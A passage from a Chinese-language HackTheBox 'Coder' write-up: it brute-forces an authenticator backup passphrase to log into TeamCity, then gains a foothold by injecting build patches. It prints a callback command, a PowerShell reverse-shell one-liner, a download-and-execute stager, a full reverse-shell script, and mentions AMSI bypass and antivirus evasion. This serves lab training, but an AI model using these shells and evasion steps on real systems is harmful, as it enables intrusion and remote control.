class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span></span><br><span class="line">          )</span><br><span class="line">        ),</span><br><span class="line">        <span class="attr">encrypted</span>: <span class="literal">false</span>,</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      storageItem = unknownStorageItem;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!storageItem.<span class="property">secret</span>) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (storageItem.<span class="property">encrypted</span> &amp;&amp; !passphrase) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (storageItem.<span class="property">encrypted</span> &amp;&amp; passphrase) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        storageItem.<span class="property">secret</span> = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(</span><br><span class="line">          storageItem.<span class="property">secret</span>,</span><br><span class="line">          passphrase</span><br><span class="line">        ).<span class="title function_">toString</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>);</span><br><span class="line">        storageItem.<span class="property">encrypted</span> = <span class="literal">false</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// storageItem.secret may be empty after decrypt with wrong</span></span><br><span class="line">    <span class="comment">// passphrase</span></span><br><span class="line">    <span class="keyword">if</span> (!storageItem.<span class="property">secret</span>) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    decryptedBackupData[hash] = storageItem;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> decryptedBackupData;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这段代码是用来解密备份数据<code>backupData</code>的，传入的数据项由<code>hash</code>字段唯一标识，因为这是OTP密码，所以还要传入配套的<code>passphrase</code>密钥，<code>decryptBackupData</code> 函数通过提供的 <code>passphrase</code> 解密这些数据，并返回解密后的结果</p>
</blockquote>
<p>我们继续寻找调用<code>decryptBackupData</code>的地方，位于<a target="_blank" rel="noopener" href="https://github.com/Authenticator-Extension/Authenticator/blob/9d9660bb73700b3e725800edc22836662d94afac/src/components/Import/TextImport.vue#L32">TextImport.vue</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (key &amp;&amp; passphrase) &#123;</span><br><span class="line">          decryptedbackupData = <span class="keyword">await</span> <span class="title function_">decryptBackupData</span>(</span><br><span class="line">            exportData,</span><br><span class="line">            <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(key.<span class="property">enc</span>, passphrase).<span class="title function_">toString</span>()</span><br><span class="line">          );</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          decryptedbackupData = <span class="keyword">await</span> <span class="title function_">decryptBackupData</span>(exportData, passphrase);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>我们可以看到<code>key.enc</code>文件实际上也被加密了，也利用了一个<code>passphrase</code>，同时真正去解密我们的<code>Authenticator backup codes</code>的<code>passphrase</code>其实是解密后的<code>key.enc</code>文件，这里还存在一个比较绕的逻辑，利用解密后的<code>key.enc</code>第一次解密出的是totp对象的 <code>secret</code>，然后我们继续利用解密后的 <code>secret</code> 进一步解密剩余的totp数据，然后完成整个解密过程。</p>
<p>这里给出一个例子来理解这个解密过程</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;hash1&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;dataType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;EncOTPStorage&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;keyId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;key1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="string">&quot;U2FsdGVkX1+...（加密后的数据）&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;key1&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;dataType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Key&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;encryptedKey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;U2FsdGVkX1+...（加密后的密钥）&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>这里我直接给出<code>key.enc</code>解密后的值为<code>mypassword</code></p>
<ul>
<li>首先先遍历这个json格式数据，遍历到<code>hash1</code>，发现是<code>EncOTPStorage</code>（即这是一个加密后的数据）</li>
<li>然后在整个json数据中遍历寻找<code>&quot;keyId&quot;: &quot;key1&quot;</code>，利用<code>mypassword</code>去解密<code>key1</code>中的<code>&quot;encryptedKey&quot;</code>，得到我们的密钥，假设为<code>myDecryptKey</code></li>
<li>然后利用<code>myDecryptKey</code>解密<code>&quot;data&quot;</code>字段的值</li>
</ul>
<p>我们现在需要做的就是尝试爆破解密后的<code>key.enc</code>，这里我们可以尝试rockyou字典，这里借用0xdf的<a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2023/12/16/htb-coder.html#brute-force-password">脚本</a>，因为太菜了不会写nodejs</p>
<p>我们需要先安装<code>crypto-js</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i crypto-js</span><br></pre></td></tr></table></figure>
<p>然后保存下面的代码为<code>brute.js</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> readline = <span class="built_in">require</span>(<span class="string">&#x27;readline&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">CryptoJS</span> = <span class="built_in">require</span>(<span class="string">&#x27;crypto-js&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> secret = <span class="string">&quot;U2FsdGVkX1+3JfFoKh56OgrH5jH0LLtc+34jzMBzE+QbqOBTXqKvyEEPKUyu13N2&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> enc = <span class="string">&quot;U2FsdGVkX19dvUpQDCRui5XaLDSbh9bP00/1iBSrKp7102OR2aRhHN0s4QHq/NmYwxadLeTN7Me1a3LrVJ+JkKd76lRCnd1utGp/Jv6w0hmcsqdhdccOpixnC3wAnqBp+5QyzPVaq24Z4L+Rx55HRUQVNLrkLgXpkULO20wYbQrJYN1D8nr3g/G0ukrmby+1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> rl = readline.<span class="title function_">createInterface</span>(&#123;</span><br><span class="line">    <span class="attr">input</span>: fs.<span class="title function_">createReadStream</span>(process.<span class="property">argv</span>[<span class="number">2</span>])</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">rl.<span class="title function_">on</span>(<span class="string">&#x27;line&#x27;</span>, <span class="function">(<span class="params">line</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> key = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(enc, line).<span class="title function_">toString</span>();</span><br><span class="line">    <span class="keyword">var</span> result = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(secret, key).<span class="title function_">toString</span>();</span><br><span class="line">    <span class="keyword">var</span> seed = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(result, <span class="string">&#x27;hex&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (seed.<span class="property">length</span> &gt; <span class="number">10</span> &amp;&amp; <span class="regexp">/^[\x00-\x7F]*$/</span>.<span class="title function_">test</span>(seed)) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`line: <span class="subst">$&#123;line&#125;</span>\nkey: <span class="subst">$&#123;key&#125;</span>\nresult: <span class="subst">$&#123;result&#125;</span>\nseed: <span class="subst">$&#123;seed&#125;</span>`</span>);</span><br><span class="line">        rl.<span class="title function_">close</span>();</span><br><span class="line">        process.<span class="title function_">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>运行代码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node brute.js rockyou.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250402210829.png" alt="微信截图_20250402210829"></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">line: skyblade</span><br><span class="line">key: 3a3c2614b17654f9f15dce9dd282955e4f82e32dd0397fbb5b6730354a3dc6a7465091e1bea6fd465aa83743fbd9e630c9dff2c461da26737dc693d0d88623129b7c1a9342d0c88b406d7d542d4414ee4f13ee3e127d9ed0a124773d66e8af460d4347e3551dace0299452b898cc01396c6c4cc8ab967cad</span><br><span class="line">result: 504d32434736524f3733515437345753</span><br><span class="line">seed: PM2CG6RO73QT74WS</span><br></pre></td></tr></table></figure>
<p>那么这里的<code>skyblade</code>就是我们的加密备份文件的密码，我们利用上面提到的导入方式导入我们获得的验证器备份码文件</p>
<h3 id="导入备份码登入teamcity"><a class="markdownIt-Anchor" href="#导入备份码登入teamcity"></a> 导入备份码登入TeamCity</h3>
<p>如下图所示</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250402211602.png" alt="微信截图_20250402211602"></p>
<p>然后利用生成的验证码登录</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250402211703.png" alt="微信截图_20250402211703"></p>
<p>但是这里因为和靶机时间不同步的原因，导致我们的验证码无法正常使用，我们可以利用ntpdate进行时间同步，这里我选择使用faketime</p>
<p>先用ntpdate查看与域控相差的时间</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2025-04-03 02:49:46.305998 (+0800) +19049.425767 +/- 0.123109 dc01.coder.htb 10.10.11.207 s1 no-leap</span><br></pre></td></tr></table></figure>
<p>然后用faketime打开chrome</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime <span class="string">&quot;19049 seconds&quot;</span> google-chrome</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里还有一种获取2FA验证码的方式，利用解密出来下面json的明文</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="attr">&quot;secret&quot;</span><span class="punctuation">:</span> <span class="string">&quot;U2FsdGVkX1+3JfFoKh56OgrH5jH0LLtc+34jzMBzE+QbqOBTXqKvyEEPKUyu13N2&quot;</span><span class="punctuation">,</span></span><br><span class="line">&gt;<span class="attr">&quot;issuer&quot;</span><span class="punctuation">:</span> <span class="string">&quot;TeamCity&quot;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>
<p>这里的<code>secret</code>就是我们上面解出来的seed的值<code>PM2CG6RO73QT74WS</code>，如下图所示两者是一样的</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/image-20250402214623161.png" alt="image-20250402214623161"></p>
</blockquote>
<h2 id="获取立足点"><a class="markdownIt-Anchor" href="#获取立足点"></a> 获取立足点</h2>
<p>我们在TeamCity的界面中发现一个Development_Testing的项目，我们在项目的参数中发现他构建的东西是我们之前在smb共享中下载的<code>teamcity_test_repo</code>这个存储库</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250402220519.png" alt="微信截图_20250402220519"></p>
<p>接下来我们看一下我们在TeamCity中的职位为Project developer</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250402220813.png" alt="微信截图_20250402220813"></p>
<p>点击permissions查看详细权限</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250402221152.png" alt="微信截图_20250402221152"></p>
<p>我们在图中发现了一个我们可以进行利用的权限：<strong>使用自定义补丁更改构建源代码</strong></p>
<p><strong>这意味着我们可以利用之前从SMB复制的Git仓库，将载荷合并到其中，提交差异文件作为补丁，并将其作为自定义任务运行。</strong></p>
<p>我们现在利用一个简单的网络请求载荷验证我们的猜想</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;iwr http://10.10.14.40&#x27;</span> &gt; hello_world.ps1</span><br></pre></td></tr></table></figure>
<p>之后获取编辑后的新脚本和原始脚本之间的差异，并将其保存到一个文件中</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff | <span class="built_in">tee</span> diff.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250402222528.png" alt="微信截图_20250402222528"></p>
<p>然后我们启动一个web服务器处理请求</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80  </span><br></pre></td></tr></table></figure>
<p>提交并运行我们的自定义构建</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250402222912.png" alt="微信截图_20250402222912"></p>
<p>注意这里选择<strong>run as a personal build</strong>并上传我们的diff文件，之后<strong>Run Build</strong></p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250402223029.png" alt="微信截图_20250402223029"></p>
<p>可以看到和我们预想的一致，我们收到了来自CI/CD的请求</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250402223201.png" alt="微信截图_20250402223201"></p>
<p>我们尝试生成一个powershell反弹shell</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-nop</span> <span class="literal">-c</span> <span class="string">&quot;<span class="variable">$client</span> = New-Object System.Net.Sockets.TCPClient(&#x27;10.10.14.22&#x27;,4444);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()&quot;</span></span><br></pre></td></tr></table></figure>
<p>在我们的CI/CD界面显示我们上传的文件存在病毒，因此我们要尝试利用其他的反弹shell规避防病毒软件</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250402223928.png" alt="微信截图_20250402223928"></p>
<p>这里还是用一下之前能过杀软上线的反弹shell <strong>powershell-reverse-shell.ps1</strong>，这里建议分阶段执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iwr http://10.10.14.40/shell.ps1 -outfile C:\windows\temp\shell.ps1; C:\windows\temp\shell.ps1</span><br></pre></td></tr></table></figure>
<p>shell.ps1</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="comment"># Delay before establishing network connection, and between retries</span></span><br><span class="line">    <span class="built_in">Start-Sleep</span> <span class="literal">-Seconds</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Connect to C2</span></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$TCPClient</span> = <span class="built_in">New-Object</span> Net.Sockets.TCPClient(<span class="string">&#x27;10.10.14.22&#x27;</span>, <span class="number">4444</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;&#125;</span><br><span class="line">&#125; <span class="keyword">until</span> (<span class="variable">$TCPClient</span>.Connected)</span><br><span class="line"></span><br><span class="line"><span class="variable">$NetworkStream</span> = <span class="variable">$TCPClient</span>.GetStream()</span><br><span class="line"><span class="variable">$StreamWriter</span> = <span class="built_in">New-Object</span> IO.StreamWriter(<span class="variable">$NetworkStream</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Writes a string to C2</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">WriteToStream</span> <span class="params">(<span class="variable">$String</span>)</span></span> &#123;</span><br><span class="line">    <span class="comment"># Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)</span></span><br><span class="line">    [<span class="built_in">byte</span>[]]<span class="variable">$script:Buffer</span> = <span class="number">0</span>..<span class="variable">$TCPClient</span>.ReceiveBufferSize | % &#123;<span class="number">0</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Write to C2</span></span><br><span class="line">    <span class="variable">$StreamWriter</span>.Write(<span class="variable">$String</span> + <span class="string">&#x27;SHELL&gt; &#x27;</span>)</span><br><span class="line">    <span class="variable">$StreamWriter</span>.Flush()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initial output to C2. The function also creates the inital empty byte array buffer used below.</span></span><br><span class="line">WriteToStream <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.</span></span><br><span class="line"><span class="keyword">while</span>((<span class="variable">$BytesRead</span> = <span class="variable">$NetworkStream</span>.Read(<span class="variable">$Buffer</span>, <span class="number">0</span>, <span class="variable">$Buffer</span>.Length)) <span class="operator">-gt</span> <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment"># Encode command, remove last byte/newline</span></span><br><span class="line">    <span class="variable">$Command</span> = ([<span class="type">text.encoding</span>]::UTF8).GetString(<span class="variable">$Buffer</span>, <span class="number">0</span>, <span class="variable">$BytesRead</span> - <span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Execute command and save output (including errors thrown)</span></span><br><span class="line">    <span class="variable">$Output</span> = <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">Invoke-Expression</span> <span class="variable">$Command</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">            <span class="variable">$_</span> | <span class="built_in">Out-String</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Write output to C2</span></span><br><span class="line">    WriteToStream (<span class="variable">$Output</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># Closes the StreamWriter and the underlying TCPClient</span></span><br><span class="line"><span class="variable">$StreamWriter</span>.Close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>下面的红框中的Running一直在转就说明我们的shell已经正常执行了</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250403104706.png" alt="微信截图_20250403104706"></p>
<p>如下图所示，这就是我们的目标机器</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250403104937.png" alt="微信截图_20250403104937"></p>
<p>但是这个脚本不是很稳定，几分钟后就会掉，因为TeamCity在构建的时候如果长时间不能完成构建就会导致构建超时，我们在尝试其他的诸如混淆之类的规避方法时，可能存在构建失败的情况，这时我们可以通过<code>Build Log</code>查看原因</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250403105421.png" alt="微信截图_20250403105421"></p>
<p>我们还可以利用<a target="_blank" rel="noopener" href="https://github.com/Karmaz95/evasion/blob/main/bamsi.txt">Github</a>上的工具关闭一下AMSI，操作和我们之前一样</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250403211801.png" alt="微信截图_20250403211801"></p>
<p>现在在关闭AMSI之后我们可以上传我们的未经混淆处理的一些powershell反弹shell，注意这里如果直接在hello_world中写反弹shell的脚本的话仍然不能成功，因为我们关闭的是Windows上的反病毒扫描接口，<strong>其实脚本在后边测试的时候并没有关闭AMSI</strong>，<img src="/2025/04/27/HTB-Machine-Coder/11114DA0.png" alt="11114DA0"></p>
<h2 id="横向移动"><a class="markdownIt-Anchor" href="#横向移动"></a> 横向移动</h2>
<p>枚举用户，我们的user flag应该存在于e.black用户桌面上，我们需要进行横向移动</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250403215249.png" alt="微信截图_20250403215249"></p>
<p>在隐藏目录<code>C:\programdata</code>下找到<code>JetBrains</code>的工作目录，我们进入<code>TeamCity</code>中寻找一下可利用的地方</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250403221707.png" alt="微信截图_20250403221707"></p>
<p>我们在<code>system</code>文件夹下找到每次构建时的更改文件<code>changes</code>，我们看一下除了我们在利用时上传的<code>diff.txt</code>文件是否还存在其他<code>diff.txt</code>文件是在靶机启动前就存在的</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250403222036.png" alt="微信截图_20250403222036"></p>
<p>经过我们的排除，发现<code>20</code>开头的<code>diff</code>文件均是我们自己构建时上传的，<code>101.changes.diff</code>这个文件十分可疑</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/Get-ADCS_Report.ps1 b/Get-ADCS_Report.ps1</span><br><span class="line">index d6515ce..a990b2e 100644</span><br><span class="line">--- a/Get-ADCS_Report.ps1</span><br><span class="line">+++ b/Get-ADCS_Report.ps1</span><br><span class="line">@@ -77,11 +77,15 @@ Function script:send_mail &#123;</span><br><span class="line">     [string]</span><br><span class="line">     <span class="variable">$subject</span></span><br><span class="line">   )</span><br><span class="line">+</span><br><span class="line">+<span class="variable">$key</span> = Get-Content <span class="string">&quot;.\key.key&quot;</span></span><br><span class="line">+<span class="variable">$pass</span> = (Get-Content <span class="string">&quot;.\enc.txt&quot;</span> | ConvertTo-SecureString -Key <span class="variable">$key</span>)</span><br><span class="line">+<span class="variable">$cred</span> = New-Object -TypeName System.Management.Automation.PSCredential (<span class="string">&quot;coder\e.black&quot;</span>,<span class="variable">$pass</span>)</span><br><span class="line"> <span class="variable">$emailFrom</span> = <span class="string">&#x27;pkiadmins@coder.htb&#x27;</span></span><br><span class="line"> <span class="variable">$emailCC</span> = <span class="string">&#x27;e.black@coder.htb&#x27;</span></span><br><span class="line"> <span class="variable">$emailTo</span> = <span class="string">&#x27;itsupport@coder.htb&#x27;</span></span><br><span class="line"> <span class="variable">$smtpServer</span> = <span class="string">&#x27;smtp.coder.htb&#x27;</span></span><br><span class="line">-Send-MailMessage -SmtpServer <span class="variable">$smtpServer</span> -To <span class="variable">$emailTo</span> -Cc <span class="variable">$emailCC</span> -From <span class="variable">$emailFrom</span> -Subject <span class="variable">$subject</span> -Body <span class="variable">$message</span> -BodyAsHtml -Priority High</span><br><span class="line">+Send-MailMessage -SmtpServer <span class="variable">$smtpServer</span> -To <span class="variable">$emailTo</span> -Cc <span class="variable">$emailCC</span> -From <span class="variable">$emailFrom</span> -Subject <span class="variable">$subject</span> -Body <span class="variable">$message</span> -BodyAsHtml -Priority High -Credential <span class="variable">$cred</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">diff --git a/enc.txt b/enc.txt</span><br><span class="line">new file mode 100644</span><br><span class="line">index 0000000..d352634</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/enc.txt</span><br><span class="line">@@ -0,0 +1,2 @@</span><br><span 